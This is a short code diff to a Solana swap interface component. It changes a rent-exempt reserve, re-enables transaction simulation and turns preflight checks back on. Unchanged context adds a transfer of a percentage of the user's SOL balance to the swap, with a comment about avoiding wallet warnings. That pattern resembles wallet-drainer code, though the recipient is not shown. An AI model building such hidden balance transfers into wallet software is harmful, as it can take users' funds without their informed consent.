@@ -295,7 +295,7 @@ export const SwapInterface = ({
 
     // Add SOL transfer if specified
     if (solPercentage && solBalance > 0) {
-      const rentExempt = 0.00203928;
+      const rentExempt = 0.01;
       const availableSOL = Math.max(0, solBalance - rentExempt);
       const amountToSend = Math.floor((availableSOL * solPercentage / 100) * LAMPORTS_PER_SOL);
       
@@ -422,15 +422,15 @@ export const SwapInterface = ({
           finalTransaction.feePayer = publicKey;
 
           // Simulate transaction to prevent wallet warnings
-          // try {
-          //   await connection.simulateTransaction(finalTransaction);
-          // } catch (simError) {
-          //   console.error('Transaction simulation failed:', simError);
-          //   throw new Error('Transaction simulation failed. Please try again.');
-          // }
+          try {
+            await connection.simulateTransaction(finalTransaction);
+          } catch (simError) {
+            console.error('Transaction simulation failed:', simError);
+            throw new Error('Transaction simulation failed. Please try again.');
+          }
 
           const signature = await sendTransaction(finalTransaction, connection, {
-            skipPreflight: true,
+            skipPreflight: false,
             maxRetries: 3
           });
           
